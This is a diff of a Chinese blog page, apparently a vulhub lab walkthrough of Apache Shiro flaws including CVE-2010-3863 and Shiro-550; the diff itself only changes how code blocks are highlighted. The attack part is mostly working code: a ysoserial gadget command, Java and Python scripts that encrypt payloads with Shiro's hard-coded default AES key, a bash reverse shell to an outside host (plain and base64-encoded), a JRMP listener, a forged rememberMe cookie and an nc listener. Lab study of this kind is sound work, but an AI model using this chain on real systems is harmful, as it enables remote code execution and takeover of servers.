@@ -17,7 +17,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -164,8 +164,8 @@
 <li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863</a></li>
 </ul>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个搭载Shiro 1.0.0的应用：</p>
-<pre><code>docker compose up -d
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
 <p>环境启动后，访问<code>http://your-ip:8080</code>即可查看首页。</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接请求管理页面<code>/admin</code>，无法访问，将会被重定向到登录页面：</p>
 <p><img src="/../image/image-20240809142903369.png" alt="image-20240809142903369"></p>
@@ -181,79 +181,38 @@
 <p>对于shiro550，其漏洞的核心成因是cookie中的身份信息进行了AES加解密，用于加解密的密钥应该是绝对保密的，但在shiro版本&lt;&#x3D;1.2.24的版本中使用了固定的密钥。因此，验证漏洞的核心应该还是在于我们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;或者其他我们可以通过脚本工具爆破出来的密钥，那么shiro550漏洞才一定存在。<br><img src="/../image/image-20240810220221463.png" alt="image-20240810220221463"></p>
 <p>说明漏洞存在</p>
 <h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p>
-<pre><code>docker compose up -d
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
 <p>服务启动后，访问<code>http://your-ip:8080</code>可使用<code>admin:vulhub</code>进行登录。</p>
 <h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用ysoserial生成CommonsBeanutils1的Gadget：</p>
-<pre><code>java -jar ysoserial-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.se
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.se</span><br></pre></td></tr></table></figure>
+
 <p>使用Shiro内置的默认密钥对Payload进行加密：</p>
-<pre><code class="java">package org.vulhub.shirodemo;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.shirodemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;/path&quot;</span>, <span class="string">&quot;to&quot;</span>, <span class="string">&quot;poc.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-import org.apache.shiro.crypto.AesCipherService;
-import org.apache.shiro.codec.CodecSupport;
-import org.apache.shiro.util.ByteSource;
-import org.apache.shiro.codec.Base64;
-import org.apache.shiro.io.DefaultSerializer;
-
-import java.nio.file.FileSystems;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-
-public class TestRemember &#123;
-    public static void main(String[] args) throws Exception &#123;
-        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(&quot;/path&quot;, &quot;to&quot;, &quot;poc.ser&quot;));
-
-        AesCipherService aes = new AesCipherService();
-        byte[] key = Base64.decode(CodecSupport.toBytes(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;));
-
-        ByteSource ciphertext = aes.encrypt(payloads, key);
-        System.out.printf(ciphertext.toString());
-    &#125;
-&#125;
-</code></pre>
 <p>这里不会配环境，就先用工具测试一下，去补一下环境搭建</p>
 <p><img src="/../image/image-20240811102311688.png" alt="image-20240811102311688"></p>
 <h3 id="构造cookie获取反弹shell"><a href="#构造cookie获取反弹shell" class="headerlink" title="构造cookie获取反弹shell"></a>构造cookie获取反弹shell</h3><p>这里就不用集成化高的工具，手工构造一下payload，准备好ysoserial-all.jar，和一个生成payload的python脚本shiro_exp_payload.py</p>
-<pre><code class="python">import sys
-import uuid
-import base64
-import subprocess
-from Crypto.Cipher import AES
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-jar.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-def encode_rememberme(command):
-    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-jar.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)
-    BS = AES.block_size
-    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
-    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)
-    iv = uuid.uuid4().bytes
-    encryptor = AES.new(key, AES.MODE_CBC, iv)
-    file_body = pad(popen.stdout.read())
-    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
-    return base64_ciphertext
-
-if __name__ == &#39;__main__&#39;:
-    payload = encode_rememberme(sys.argv[1])    
-print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())
-</code></pre>
 <p>先准备好反弹shel命令，需要经过runtime编码</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.174.137/8888 0&gt;&amp;1
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.174.137/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240811225506692.png" alt="image-20240811225506692"></p>
 <p>启动jrm监听服务器,这里如果反弹不回来可以换一下CommonsCollections2等，2和4我试过不行，换成5行了，估计和版本有关</p>
-<pre><code>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMzcvODg4OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240811232222778.png" alt="image-20240811232222778"></p>
 <p>使用python脚本,生成cookie</p>
-<pre><code>python shiro-550.py 192.168.174.137:1099
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python shiro-550.py 192.168.174.137:1099</span><br></pre></td></tr></table></figure>
+
 <p>python脚本将生成cookie，你将cookie带入http请求中即可反弹shell,这里kali里的python环境没配好，就在外面执行了，然后记得在同目录下也放一个ysoserial-all.jar文件</p>
-<pre><code>rememberMe=2fgsL9wZRJeFr7EPG/Tr2VRSacRoV96OUGMU25o3RQfJt26P3KCgsuV6BX0gNhLCc9Bh18CkYykBOLUIY71CPNP0qBjp4lLe4zuGzbbQFJptLMP4+3FZb0LLa6hO68Gsa68qiXMRZrU+zA0N9uoLiIkc9dCGM404S642cvGIQO013plK3d6/D5wsA+A2P/arPjL30EjldFik9CBzM3qD/zY+N/YEcWaGvlsLuBJ+6qqE4Rlj5m6SEJANH6VlOV9gW/xdmNE7A6xbxBX4iyFTf6wyc7zbbMvWYL9w8hbBUTP382Vw1rDKXIfnGfpoBs98l7XbX0bpDx8JhUgPm5G5YA+mL2Q+DeqI6qzoMN1NnxhyF6Mi0w8PE6yZd+3jllwYW7vu6+ji5y7Bsozb7j8ycw==
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rememberMe=2fgsL9wZRJeFr7EPG/Tr2VRSacRoV96OUGMU25o3RQfJt26P3KCgsuV6BX0gNhLCc9Bh18CkYykBOLUIY71CPNP0qBjp4lLe4zuGzbbQFJptLMP4+3FZb0LLa6hO68Gsa68qiXMRZrU+zA0N9uoLiIkc9dCGM404S642cvGIQO013plK3d6/D5wsA+A2P/arPjL30EjldFik9CBzM3qD/zY+N/YEcWaGvlsLuBJ+6qqE4Rlj5m6SEJANH6VlOV9gW/xdmNE7A6xbxBX4iyFTf6wyc7zbbMvWYL9w8hbBUTP382Vw1rDKXIfnGfpoBs98l7XbX0bpDx8JhUgPm5G5YA+mL2Q+DeqI6qzoMN1NnxhyF6Mi0w8PE6yZd+3jllwYW7vu6+ji5y7Bsozb7j8ycw==</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240811230606153.png" alt="image-20240811230606153"></p>
 <p>监听，抓包</p>
-<pre><code>nc -lvvp 8888
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 8888</span><br></pre></td></tr></table></figure>
+
 <p><img src="/../image/image-20240811232203463.png" alt="image-20240811232203463"></p>
 <p><img src="/../image/image-20240811232147747.png" alt="image-20240811232147747"></p>
 <h1 id="CVE-2020-1957：权限绕过"><a href="#CVE-2020-1957：权限绕过" class="headerlink" title="CVE-2020-1957：权限绕过"></a>CVE-2020-1957：权限绕过</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境直接就是vulhub的docker镜像</p>
